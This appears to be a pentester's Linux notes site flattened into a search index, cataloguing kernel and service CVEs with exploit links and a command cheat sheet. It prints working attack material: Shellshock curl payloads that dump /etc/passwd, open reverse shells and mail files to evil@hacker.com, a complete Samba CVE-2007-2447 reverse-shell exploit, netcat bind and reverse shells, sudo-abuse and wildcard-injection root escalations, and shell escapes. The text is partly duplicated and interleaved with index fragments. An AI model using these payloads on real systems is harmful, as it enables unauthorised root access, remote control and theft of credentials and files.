to the parent session By using the TIOCSTI ioctl to push characters into the terminal's input buffer #include unistd.h #include sys/ioctl.h int main () { char * cmd = id \\n ; while ( * cmd ) ioctl ( 0 , TIOCSTI , cmd ++ ); execlp ( /bin/id , id , NULL ); } $ gcc test . c - o test $ / bin / sandbox . / test id References https://seclists.org/oss-sec/2016/q3/606 CVE-2017-1000112 - UFO Linux kernel Ubuntu Trusty 4.4.0-* Ubuntu Xenial 4-8-0-* Ubuntu Xenial (16.04) 4.4.0-81 References https://www.openwall.com/lists/oss-security/2017/08/13/1 https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html Exploit https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112 Practice HTB - Nightmare CVE-2019-13272 - Linux kernel 5.1.17 - Unauthorized Access https://0day.life/exploit/0day-636.html?fbclid=IwAR3ZMXDf8TXs7Q_k5rgL8je4BKPPEgUb106uZEMGoxNgCs08y60KXstqOsY ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship allows local users to obtain root access SELinux deny_ptrace might be a usable workaround CVE-2017-6074 - Linux Kernel DCCP double free Double-free vulnerability in the Datagram Congestion Control Protocol (DCCP) Allows an unprivileged user to alter kernel memory from an unprivileged process or cause a denial of service. Applies to all Linux kernels since 2.6.18 (September 2006) - may have been first introduced as early as October 2005 The Datagram Congestion Control Protocol (DCCP) is designed to support streaming media and telephony. There is a weakness in the way that it freed SKB (socket buffer) resources if the IPV6_RECVPKTINFO option is enabled on the socket. The kernel believed that the memory was still in use by the SKB, allowing an unprivileged local user to write to the kernel's memory space, and then to have any code that was written executed within the kernel. References https://blog.cloudpassage.com/2017/02/23/vulnerability-linux-kernel-dccp/ Exploit https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074 Practice HTB - Blocky DirtyCow - CVE-2016-5195 A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. Gain write access to otherwise read-only memory mappings. Exploit https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/FireFart/dirtycow/blob/master/dirty.c overlayfs Linux Kernel 3.13.0 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation: https://www.exploit-db.com/exploits/37292 Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1): https://www.exploit-db.com/exploits/39166 Linux Kernel 4.3.3 - 'overlayfs' Local Privilege Escalation (2): https://www.exploit-db.com/exploits/39230 Other Mempodipper compiled (Ubuntu 11 - gimmeroot.c) Ubuntu ( = 18.10) - Dirty Sock: https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html https://github.com/initstring/dirty_sock/ Ubuntu 14.04 and 16.04: (CVE-2017-1000112) https://cxsecurity.com/issue/WLB-2018010018 Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) https://www.exploit-db.com/exploits/14339 HTB: Beep GNU Screen 4.5.0 - Local Privilege Escalation - https://www.exploit-db.com/exploits/41154 - Nice example for learning exploit writing CVE-2010-2961 - Ubuntu 10.04/10.10) - Local Privilege Escalation mountall.c in mountall before 2.15.2 uses 0666 permissions for the root.rules file, which allows local users to gain privileges by modifying this file. http://www.outflux.net/blog/archives/2010/10/13/mountall-umask/ https://www.ethicalhacker.net/features/root/tutorial-hacking-linux-with-armitage/","title":"Linux issues"},{"location":"linux-issues/#collections","text":"https://github.com/lucyoa/kernel-exploits","title":"Collections"},{"location":"linux-issues/#exploits","text":"","title":"Exploits"},{"location":"linux-issues/#cve-2014-6271-shellshock","text":"Bash 4 . 3 and earlier Execute commands from environment variables unintentionally. Caused by Bash processing trailing strings after function definitions in the values of environment variables. Exploitable when attacker has control of environment variables. https://fedoramagazine.org/shellshock-how-does-it-actually-work/ GET http :// shellshock . testsparker . com / cgi-bin / netsparker . cgi HTTP / 1 . 1 User-Agent : Netsparker Host : shellshock . testsparker . com Referer : () { : ;} ; echo NS: $( / etc / passwd ) Test if Vulnerable env x = () { :;}; echo OOPS bash -c : env x = () { :;}; echo vulnerable bash -c echo not-vulnerable Explanation To run a command in a new shell bash -c ls New shell inherits environment If new shell finds what seems to be a function in an environment variable: New shell executes the function to get the actual value When function is executed, evaluation didn't stop when the end of the function definition is reached. Hence, when new shell sees () { :; } ; , bash will start executing the function and proceed to also execute the echo . Samples Passwd curl -A () { :;}; echo Content-Type: text/plain ; echo; /bin/cat /etc/passwd http://192.168.1.14/cgi-bin/status curl -H user-agent: () { :; }; echo; echo; /bin/bash -c cat /etc/passwd \\ http://192.168.1.14/cgi-bin/status Directory Listing curl -A () { :;}; echo Content-Type: text/plain ; echo; /bin/ls / http://192.168.1.14/cgi-bin/status Reverse shell curl -A () { :; }; /bin/bash -c /usr/bin/nc -lvvp 2345 -e /bin/bash http://192.168.1.14/cgi-bin/status curl -H User-Agent: () { :; }; /bin/bash -i /dev/tcp/10.10.14.203/1234 0 1 http://10.10.10.56/cgi-bin/user.sh Setuid shell: () { :; } ; cp / bin / bash / tmp / bash chmod 4755 / tmp / bash Fork Bomb: () { :; } ; :() { : | : } ;: Ping Bot: () { :; } ; ping - s 1000000 victim IP Data Theft: () { : ; } ; find ~ - print | mail - s Your files evil @hacker . com () { : ; } ; cat ~/ . secret / passwd | mail - s This password file evil @hacker . com Exploitation Vectors https://github.com/opsxcq/exploit-CVE-2014-6271 CGI Bash will receive the environment variables passed by the server Server passes various details of the request to a handler program in the environment variable list. For example, HTTP_USER_AGENT . exploit / multi / http / apache_mod_cgi_bash_env_exec Apache mod_cgi - 'Shellshock' Remote Command Injection OpenSSH ForceCommand will execute a fixed command on login If user specify a command to run, user specific command is put into environment ( SSH_ORIGINAL_COMMAND ) Bash will parse SSH_ORIGINAL_COMMAND on start-up, and run the commands DHCP clients Some DHCP clients can also pass commands to Bash Malicious DHCP server provide, a string crafted to execute code (in an addition option) Qmail server Qmail mail server passes external input through in a way that can exploit a vulnerable version of Bash. IBM HMC restricted shell References Shellshock: How does it actually work? [Related Issues+] ShellShock: All you need to know about the Bash Bug vulnerability Practice https://pentesterlab.com/exercises/cve-2014-6271 [Docker] Shellshock exploit + vulnerable environment HTB - Shocker","title":"CVE-2014-6271 - Shellshock"},{"location":"linux-issues/#cve-2014-7169","text":"","title":"CVE-2014-7169"},{"location":"linux-issues/#cve-2014-0160-heartbleed","text":"Exploits https://github.com/sensepost/heartbleed-poc https://gist.github.com/eelsivart/10174134 References https://fedoramagazine.org/update-on-cve-2014-0160-aka-heartbleed/","title":"CVE-2014-0160 - Heartbleed"},{"location":"linux-issues/#cve-2016-4971-gnu-wget-118-arbitrary-file-upload-remote-code-execution","text":"issuing a crafted HTTP 30X Redirect containing FTP server reference in response wget will automatically follow the redirect wget will download a malicious file from the FTP server (to current dir) wget will fail to rename the file to the originally requested filename will not work with - O However, By saving .wgetrc in / home / victim / . wgetrc could set arbitrary wget settings such as destination directory Exploits https://www.exploit-db.com/exploits/40064","title":"CVE-2016-4971 - GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution"},{"location":"linux-issues/#openssh-66-sftp-misconfiguration","text":"Exploit https://github.com/SECFORCE/sftp-exploit References https://www.secforce.com/blog/2018/03/openssh_exploit_32_and_64_bit/ Practice HTB - Nightmare","title":"OpenSSH &lt;=6.6 SFTP misconfiguration"},{"location":"linux-issues/#cve-2007-2447-smb-samba-3020-3025rc3","text":"Exploitable when using the non-default \"username map script\" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. Case study: https://amriunix.com/post/cve-2007-2447-samba-usermap-script/ exploit / multi / samba / usermap_script Exploits : https://github.com/amriunix/cve-2007-2447 #!/usr/bin/python # -*- coding: utf-8 -*- # From : https://github.com/amriunix/cve-2007-2447 # case study : https://amriunix.com/post/cve-2007-2447-samba-usermap-script/ import sys from smb.SMBConnection import SMBConnection def exploit ( rhost , rport , lhost , lport ): payload = mkfifo /tmp/hago; nc + lhost + + lport + 0 /tmp/hago | /bin/sh /tmp/hago 2 1; rm /tmp/hago username = /=`nohup + payload + ` conn = SMBConnection ( username , , , ) try : conn . connect ( rhost , int ( rport ), timeout = 1 ) except : print [+] Payload was sent - check netcat ! if __name__ == __main__ : print ( [*] CVE-2007-2447 - Samba usermap script ) if len ( sys . argv ) != 5 : print ( [-] usage: python + sys . argv [ 0 ] + RHOST RPORT LHOST LPORT ) else : print ( [+] Connecting ! ) rhost = sys . argv [ 1 ] rport = sys . argv [ 2 ] lhost = sys . argv [ 3 ] lport = sys . argv [ 4 ] exploit ( rhost , rport , lhost , lport )","title":"CVE-2007-2447 - (SMB) Samba 3.0.20 &lt; 3.0.25rc3"},{"location":"linux-issues/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"linux-issues/#cve-2010-0832-linux-pam-11x-motd-file-tampering","text":"pam_motd (aka the MOTD module) in libpam-modules Before 1.1.0-2ubuntu1.1 in PAM on Ubuntu 9.10 Before 1.1.1-2ubuntu5 in PAM on Ubuntu 10.04 LTS Change the ownership of arbitrary files via a symlink attack on .cache in a user's home directory. \"user file stamps\" and the motd . legal - notice file. Exploits https://www.exploit-db.com/exploits/14339 https://www.exploit-db.com/exploits/14273 https://twitter.com/jonoberheide/status/18009527979 Practice HTB - Popcorn","title":"CVE-2010-0832 - Linux PAM 1.1.X MOTD File Tampering"},{"location":"linux-issues/#cve-2015-5602-sudoedit-unauthorized-privilege-escalation","text":"RHEL /7 / Ubuntu Sudo = 1.8.14 When /etc/sudoers reads: user_to_grant_priv ALL = ( root ) NOPASSWD : sudoedit / home /*/*/test.txt Sudoedit does not check the full path if a wildcard is used twice (e.g. /home/ / /file.txt), Allowing a malicious user to replace the file.txt real file with a symbolic link to a different location (e.g. /etc/shadow). Example / home / user_to_grant_priv / newdir , test . txt pointing to / etc / shadow ln - sf / etc / shadow / home / user_to_grant_priv / newdir / test . txt Then do sudoedit / home / user_to_grant_priv / newdir / test . txt OR sudoedit - u user_to_grant_priv / home / user_to_grant_priv / newdir / test . txt https://github.com/t0kx/privesc-CVE-2015-5602/blob/master/exploit.sh Usages Expose /etc/shadow Expose \u200bauthorized_keys over HTTP cd / var / www / testing / writeup ln - s / home / alekos / . ssh / authorized_keys layout . html References https://www.exploit-db.com/exploits/37710 Practice https://github.com/t0kx/privesc-CVE-2015-5602 HTB - Jocker","title":"CVE-2015-5602 - 'Sudoedit' Unauthorized Privilege Escalation"},{"location":"linux-issues/#cve-2016-7545-selinux-sandbox-escape","text":"When executing a program via the SELinux sandbox The nonpriv session can escape to the parent session By using the TIOCSTI ioctl to push characters into the terminal's input buffer #include unistd.h #include sys/ioctl.h int main () { char * cmd = id \\n ; while ( * cmd ) ioctl ( 0 , TIOCSTI , cmd ++ ); execlp ( /bin/id , id , NULL ); } $ gcc test . c - o test $ / bin / sandbox . / test id References https://seclists.org/oss-sec/2016/q3/606","title":"CVE-2016-7545 - SELinux sandbox escape"},{"location":"linux-issues/#cve-2017-1000112-ufo-linux-kernel","text":"Ubuntu Trusty 4.4.0-* Ubuntu Xenial 4-8-0-* Ubuntu Xenial (16.04) 4.4.0-81 References https://www.openwall.com/lists/oss-security/2017/08/13/1 https://ricklarabee.blogspot.com/2017/12/adapting-poc-for-cve-2017-1000112-to.html Exploit https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-1000112 Practice HTB - Nightmare","title":"CVE-2017-1000112 - UFO Linux kernel"},{"location":"linux-issues/#cve-2019-13272-linux-kernel-5117-unauthorized-access","text":"https://0day.life/exploit/0day-636.html?fbclid=IwAR3ZMXDf8TXs7Q_k5rgL8je4BKPPEgUb106uZEMGoxNgCs08y60KXstqOsY ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship allows local users to obtain root access SELinux deny_ptrace might be a usable workaround","title":"CVE-2019-13272 - Linux kernel 5.1.17 - Unauthorized Access"},{"location":"linux-issues/#cve-2017-6074-linux-kernel-dccp-double-free","text":"Double-free vulnerability in the Datagram Congestion Control Protocol (DCCP) Allows an unprivileged user to alter kernel memory from an unprivileged process or cause a denial of service. Applies to all Linux kernels since 2.6.18 (September 2006) - may have been first introduced as early as October 2005 The Datagram Congestion Control Protocol (DCCP) is designed to support streaming media and telephony. There is a weakness in the way that it freed SKB (socket buffer) resources if the IPV6_RECVPKTINFO option is enabled on the socket. The kernel believed that the memory was still in use by the SKB, allowing an unprivileged local user to write to the kernel's memory space, and then to have any code that was written executed within the kernel. References https://blog.cloudpassage.com/2017/02/23/vulnerability-linux-kernel-dccp/ Exploit https://github.com/xairy/kernel-exploits/tree/master/CVE-2017-6074 Practice HTB - Blocky","title":"CVE-2017-6074 - Linux Kernel DCCP double free"},{"location":"linux-issues/#dirtycow-cve-2016-5195","text":"A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. Gain write access to otherwise read-only memory mappings. Exploit https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs https://github.com/FireFart/dirtycow/blob/master/dirty.c","title":"DirtyCow - CVE-2016-5195"},{"location":"linux-issues/#overlayfs","text":"Linux Kernel 3.13.0 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation: https://www.exploit-db.com/exploits/37292 Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege Escalation (1): https://www.exploit-db.com/exploits/39166 Linux Kernel 4.3.3 - 'overlayfs' Local Privilege Escalation (2): https://www.exploit-db.com/exploits/39230","title":"overlayfs"},{"location":"linux-issues/#other","text":"Mempodipper compiled (Ubuntu 11 - gimmeroot.c) Ubuntu ( = 18.10) - Dirty Sock: https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html https://github.com/initstring/dirty_sock/ Ubuntu 14.04 and 16.04: (CVE-2017-1000112) https://cxsecurity.com/issue/WLB-2018010018 Linux PAM 1.1.0 (Ubuntu 9.10/10.04) - MOTD File Tampering Privilege Escalation (2) https://www.exploit-db.com/exploits/14339 HTB: Beep GNU Screen 4.5.0 - Local Privilege Escalation - https://www.exploit-db.com/exploits/41154 - Nice example for learning exploit writing CVE-2010-2961 - Ubuntu 10.04/10.10) - Local Privilege Escalation mountall.c in mountall before 2.15.2 uses 0666 permissions for the root.rules file, which allows local users to gain privileges by modifying this file. http://www.outflux.net/blog/archives/2010/10/13/mountall-umask/ https://www.ethicalhacker.net/features/root/tutorial-hacking-linux-with-armitage/","title":"Other"},{"location":"linux/","text":"Quick Reference Bash cheatsheet: https://devhints.io/bash.html Archiving/compressing: https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-archiving-compressing-files-0166153/ OS Information System Information cat /proc/net/dev lspci ip link show ip addr show lscpu cat /proc/cpuinfo File information: file filename Shared library dependencies: ldd filename Searching: With database: updatedb ; locate sbd . exe Within PATH: which sbd whereis sdb Complex: find / -\u00ad\u2010name sbd* find / --name sdb* --exec file {} \\; Search for hidden (dot) files find / - type d - name .* Mounting Devices: mount -t filesystemtype location mount -t /dev/cdrom /media umount /dev/cdrom Distribution cat / etc / issue cat / etc /*-release cat /etc/lsb-release ### Debian based cat /etc/redhat-release ### Redhat based Kernel cat / proc / version uname - a uname - mrs rpm - q kernel dmesg | grep Linux ls / boot | grep vmlinuz - Kernel tuning Temporary: sysctl Permanent: / etc / sysctl . conf View configuration: sysctl - a | less View configuration files for the installed modprobe modules: ls - l / etc / modprobe . d / ls - R / lib / modules / $ ( uname - r ) / kernel Kernel Modules Insert module: insmod Remove module: modprobe - r rmmod List modules: modprobe - l lsmod Environment cat / etc / profile cat / etc / bashrc cat ~/ . bash_profile cat ~/ . bashrc cat ~/ . bash_logout env set Printers: lpstat - a Sys calls: / usr / include / i386 - linux - gnu / asm / unistd_32 . h New line in command line $ echo abc[CTRL+M] def Change password (one liner): echo root : password | / usr / sbin / chpasswd Bash Variables: $ 0 - The name of the Bash script $ 1 - $9 - The first 9 arguments to the Bash script $ # - Number of arguments passed to the Bash script $ @ - All arguments passed to the Bash script $ ? - The exit status of the most recently run process $$ - The process ID of the current script $ USER - The username of the user running the script $ HOSTNAME - The hostname of the machine $ RANDOM - A random number $ LINENO - The current line number in the script Startup Process https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/ Run levels 0 - halt the system 1 - single user mode ( minimal services ) 2 - multi - user modes 3 - multi - user mode 4 - multi - user mode 5 - multi - user mode 6 - reboot the system Init.d Process Has process ID: 1 / etc / init . d scripts with 755 permission init process then hands over the boot-up processes to rc . d daemon rc.local - Script to start necessary processes in the background when the system boots up: / etc / init . d / rc . local Daemons inetd , xinetd - Inetd always runs in the background and it then decides when to start and stop other daemons. rlinetd rlinetd . conf / etc / rlinetd . d Disable unnecessary demons Configure IPs that can access a demon Managing Disks Managing Hard Disks hda for hard disks. sda for newer SATA disks (SCSI). Partitions within sda are sda1 , sda2 , ... Basic disk Information: df - h Partitions on disk: fdsisk - l Block device information: lsblk Editing and displaying partitions: parted / cfdisk ( parted ) print ( parted ) select / dev / sdb Change HDD parameters: hdparm Debugfs Simple-to-use RAM-based file system specially designed for debugging purposes Mount file system (usable to access / root by only being in disk group) debugfs / dev / sda1 Permissions File Permissions: 0 = No Permission 1 = Execute 2 = Write 4 = Read r w x 4 2 1 = 7 Setuid - Set User ID - The process's effective user ID gets set to that of the program file itself (rather than that of the user running it). S - just the setuid bit s - setuid bit and execute x Dir - No effect on DIRs Find SUID: find . - perm / 4000 Setgid - Set Group ID - The process's effective group ID gets set to that of the program file (rather than that of the user's primary group). Dir - any files created in that directory will have the same group as that directory http://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html Find GUID: find . - perm / 2000 Find SUID / SGID: find . - perm / 6000 Find and ls SUID / SGID: find $DIRECTORY - perm / 6000 - exec ls - la {} \\ ; Searching world writable files: find / - perm - w ~ - type l - ls 2 ?/ dev / null Check file permissions of / etc / passwd and / etc / shadow Find writable files: find - type f - maxdepth 1 - writable Processes Running processes: ps aux ps - ef top Tree of processes (processes threads): pstree - aclp Process priority: nice - n - 20 command renice nice - value pid - 20 is highest priority 19 is lowest priority Memory map for a process: cat / proc / 1234 / maps gdb info proc mappings pmap - d 1234 / proc - / proc / id / environ environment variables - / proc / id / cmdline command line args/command used to run the process - / proc / id / maps memory map - / proc / id / fd open file descriptors Trace system and library calls ltrace strace Access control access - Check permissions for the UID and GID of the process (executable file owner / group) Check is done using the calling process's real UID and GID, rather than the effective IDs as is done when actually attempting an operation (e.g., open(2)) on the file. Process ID of a port: fuser - n tcp ( PORT NUMBER ) ps aux | grep $ ( fuser - n tcp 45295 | awk {print $2} ) Services List of Services: cat / etc / services Commons service configurations cat / etc / syslog . conf cat / etc / chttp . conf cat / etc / lighttpd . conf cat / etc / cups / cupsd . conf cat / etc / inetd . conf cat / etc / apache2 / apache2 . conf cat / etc / my . conf cat / etc / httpd / conf / httpd . conf cat / opt / lampp / etc / httpd . conf ls - aRl / etc / | awk $ 1 ~ /^ . * r . */ Check if certain service is up: update - \u00ad\u2010 rc . d ssh enable Auto start a service: update - \u00ad\u2010 rc . d ssh enable Systemd services: / lib / systemd / system / snapd . service Systemd socket unit file: [Socket] ListenStream = /run/snapd.socket ListenStream = /run/snapd-snap.socket SocketMode = 0666 0666 - Allow any process to connect and communicate with the socket. Networking Interface Information / sbin / ifconfig - a cat / etc / network / interfaces cat / etc / sysconfig / network Network configuration cat / etc / resolv . conf cat / etc / sysconfig / network cat / etc / networks iptables - L hostname dnsdomainname Monitor network communication lsof - i lsof - i : 80 grep 80 / etc / services netstat - antup netstat - antpx netstat - tulpn chkconfig --list chkconfig --list | grep 3:on last w Cached IP and Mac Information arp - e route / sbin / route - nee Change IP ifconfig eth0 192 . 168 . 1 . 115 ifconfig eth0 192 . 168 . 1 . 115 netmask 255 . 255 . 255 . 0 broadcast 192 . 168 . 1 . 255 Shell with built-in tools nc - lvp 4444 ### Attacker . Input ( Commands ) nc - lvp 4445 ### Attacker . Ouput ( Results ) telnet [ atackers ip ] 44444 | / bin / sh | [ local ip ] 44445 ### On the targets system . Use the attackers IP ! https://www.lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ AF_UNIX - Used to communicate between processes on the same machine AF_INET and AF_INET6 - Used for processes to communicate over a network connection. Interact with AF_UNIX Socket nc - U / run / snapd . socket GET / HTTP / 1 . 1 Host : 127 . 0 . 0 . 1 Process ID of a port: fuser - n tcp ( PORT NUMBER ) ps aux | grep $ ( fuser - n tcp 45295 | awk {print $2} ) Tools Ship - one-stop-shop for basic network reconnaissance and addressing: https://github.com/xtonousou/ship.git https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/ Tools grep Color word root: grep --color root /etc/passwd OR: grep - e how - e to - e forge * . txt https://www.howtoforge.com/tutorial/linux-grep-command/ Option Details - i Ignore case - r - R Recursive grep - R example / etc / apache2 / - w Match words - e Regex match grep - w - e word1|word2 / path / to / file - n Line number - c Count - v Invert - x Exact match - l File names with match - L File names without match iptables count packets sent and received iptables - Z iptables - F iptables - I INPUT 1 - s IP - j ACCEPT iptables - I OUTOUT 1 - d IP - j ACCEPT ip tables - vn - L Netcat Chat nc - nlvp 4444 nc - nv ip 4444 File Transfer nc - nlvp 4444 file . exe nc - nv ip 4444 file . exe Bind Shell VICTIM (server): nc - lvp 4444 - e cmd . exe ATTACKER (client): nc - nv IP Address 4444 Reverse Shell ATTACKER (server): nc - lvp 4444 VICTIM (client): nc - nv IP Address 4444 - e cmd . exe NCAT for increased security VICTIM (server): ncat - lvp 4444 - e cmd . exe --allow 192.168.30.5 --ssl ATTACKER (client): ncat - nv IP Address 4444 --ssl Port Scanning TCP Connect Port Scan: nc - nvv - w 1 - z ip 1 - 65550 UDP Scan: nc - unvv - w 1 - z ip 1 - 65550 tcpdump Packet Capture tcpdump tcp dst [ ip ] [ port ] and tcp dst [ ip ] [ port ] tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21 Open a PCAP: tcpdump - \u00ad r password_cracking_filtered . pcap Cut only IP addresses from the traffic: tcpdump - \u00ad r password_cracking_filtered . pcap | awk - \u00ad\u2010 F {print $3} | sort - \u00ad\u2010 u | head Filter Destination or Source tcpdump - n src host ip - \u00ad r password_cracking_filtered . pcap tcpdump - n dst host ip \u2010 r password_cracking_filtered . pcap tcpdump - n port port - \u00ad r password_cracking_filtered . pcap Advanced Header Filtering: tcpdump - A - n tcp[13] = 24 - \u00ad\u2010 r password_cracking_filtered . pcap Other important flags - nn stop DNS and service names lookup (performance+) - X and - XX can be used to print each packet in hex and ascii - A print packets in ASCII - S to print absolute sequence numbers - s can be used to increase the default snap-length from 262144 to higher - s 0 to capture full packet References: https://hackertarget.com/tcpdump-examples/ General Exploits Enumeration Scripts BeRoot: https://github.com/AlessandroZ/BeRoot/tree/master/Linux unix-privesc-check: https://github.com/pentestmonkey/unix-privesc-check linuxprivchecker.py: http://www.securitysift.com/download/linuxprivchecker.py LinEnum: https://github.com/rebootuser/LinEnum Lse.sh: https://github.com/diego-treitos/linux-smart-enumeration LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite Escape shell Information about environment: env echo $ PATH echo / usr / local / rbin /* List read only variables (check If PATH or SHELL is writable): export - p VI / VIM: : set shell =/ bin / bash : shell : sh | : ! / bin / bash | : r / root / root . txt | : e / root / root . txt AWK: awk BEGIN {system( /bin/sh )} Find: find / - name blahblah - exec / bin / awk BEGIN {system( /bin/sh )} \\ ; More / Less / Man: ! / bin / sh !/ bin / sh !bash Tee: echo evil script code | tee script . sh Languages python: exit_code = os.system ( /bin/sh ) output = os.popen ( /bin/sh ) .read () perl -e exec /bin/sh ; perl: exec /bin/sh ; ruby: exec /bin/sh lua: os.execute ( /bin/sh ) irb ( main:001:0 exec /bin/sh Copy files into $ PATH Copy file into HOME (scp/ftp) Some restricted shells will start by running some files in an unrestricted mode (If your .bash_profile is executed in an restricted mode and it's editable) If HISTFILE and HISTSIZE are writable: Set HISTFILE to the file you want to overwrite (preferably an executable) Set HISTSIZE to 0 and then back to 100, Then execute the lines you want in your shell script https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ Wildcards Char Description * Any number of characters, including none. ? Any single character. [ ] Set of characters, any one of which may match a single character at that position. - Used within [ ] denotes a range of characters. ~ At the beginning of a word expands to the name of your home directory. If you append another user's login name to the character, it refers to that user's home directory. Using wildcard to inject arguments # ls -al drwxrwxr-x. 2 leon leon 4096 Oct 28 17 :04 DIR1 drwxrwxr-x. 2 leon leon 4096 Oct 28 17 :04 DIR2 -rw-rw-r--. 1 leon leon 0 Oct 28 17 :03 file1.txt -rw-rw-r--. 1 leon leon 0 Oct 28 17 :03 file2.txt -rw-rw-r--. 1 nobody nobody 0 Oct 28 16 :38 -rf # rm * # ls -al -rw-rw-r--. 1 nobody nobody 0 Oct 28 16 :38 -rf # strace rm * execve ( /bin/rm , [ rm , DIR1 , DIR2 , file1.txt , file2.txt , -rf ] , [ /* 25 vars */ ]) = 0 chown --reference=RFILE use RFILE s owner and group rather than specifying OWNER : GROUP values # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17 :40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17 :35 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17 :45 --reference = .drf.php # chown -R nobody:nobody *.php # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 17 :40 .drf.php -rw-rw-r--. 1 leon leon 117 Oct 28 17 :35 inc.php -rw-rw-r--. 1 leon leon 111 Oct 28 17 :38 index.php -rw-rw-r--. 1 leon leon 0 Oct 28 17 :45 --reference = .drf.php chmod --reference = RFILE use RFILE s mode instead of MODE values # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00 :40 .drf.php -rw-rw-r--. 1 user user 117 Oct 28 17 :36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00 :41 --reference = .drf.php # chmod 000 * # ls -la -rwxrwxrwx. 1 leon leon 0 Oct 29 00 :40 .drf.php -rwxrwxrwx. 1 user user 117 Oct 28 17 :36 inc.php -rwxrwxrwx. 1 user user 111 Oct 28 17 :38 index.php -rw-r--r--. 1 leon leon 0 Oct 29 00 :41 --reference = .drf.php tar command Execution --checkpoint [= NUMBER ] display progress messages every NUMBERth record ( default 10 ) --checkpoint-action = ACTION execute ACTION on each checkpoint # ls -la -rw-r--r--. 1 leon leon 0 Oct 28 19 :19 --checkpoint = 1 -rw-r--r--. 1 leon leon 0 Oct 28 19 :17 --checkpoint-action = exec = sh shell.sh -rw-rw-r--. 1 user user 117 Oct 28 17 :36 inc.php -rw-rw-r--. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 12 Oct 28 19 :17 shell.sh # tar cf archive.tar * uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Rcync command Execution -e, --rsh = COMMAND specify the remote shell to use --rsync-path = PROGRAM specify the rsync to run on remote machine # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04 :45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17 :36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04 :45 shell.c # rsync -t *.c foo:src/ rsync: connection unexpectedly closed ( 0 bytes received so far ) [ sender ] rsync error: error in rsync protocol data stream ( code 12 ) at io.c ( 601 ) [ sender = 3 .0.8 ] # ls -al -rw-r--r--. 1 leon leon 0 Mar 28 04 :45 -e sh shell.c -rwxr-xr-x. 1 user user 117 Oct 28 17 :36 inc.php -rwxr-xr-x. 1 user user 111 Oct 28 17 :38 index.php -rwxr-xr-x. 1 leon leon 31 Mar 28 04 :45 shell.c -rw-r--r--. 1 root root 101 Mar 28 04 :49 shell_output.txt # cat shell.c /usr/bin/id shell_output.txt # cat shell_output.txt uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) context = unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 Practice HTB - Joker Create a script, setuid bit and then use this attack to chown the script to gain prev-esc Exploits Related to Tools Tar: sudo tar - cf / dev / null / dev / null -- checkpoint = 1 -- checkpoint - action = exec =/ bin / bash echo -e #!/bin/bash\\n\\nbash -i /dev/tcp/10.10.15.99/8082 0 1 a.sh tar -cvf a.tar a.sh sudo tar -xvf a.tar --to-command /bin/bash Zip: sudo zip / tmp / test . zip / tmp / test - T --unzip-command= sh -c /bin/bash Strace: sudo strace - o / dev / null / bin / bash tcpdump echo $\u2019id \\n cat /etc/shadow\u2019 /tmp/.shell chmod +x /tmp/.shell sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell-Z root nmap echo os.execute( /bin/sh ) / tmp / shell . nse sudo nmap --script=/tmp/shell.nse scp: sudo scp - S / path / yourscript x y except: sudo except spawn sh then sh nano: sudo nano - S / bin / bash type your command and hit CTRL+T git: sudo git help status type: !/bin/bash gdb/ftp: sudo ftp type : !/bin/sh Other File execution due to not using quotes # Files in `SLAPPER_FILES` list will get executed: for i in ${ SLAPPER_FILES } ; do if [ -f ${ i } ] ; then file_port = $file_port $i # Correction: file_port= $file_port $i STATUS = 1 fi done Ref: 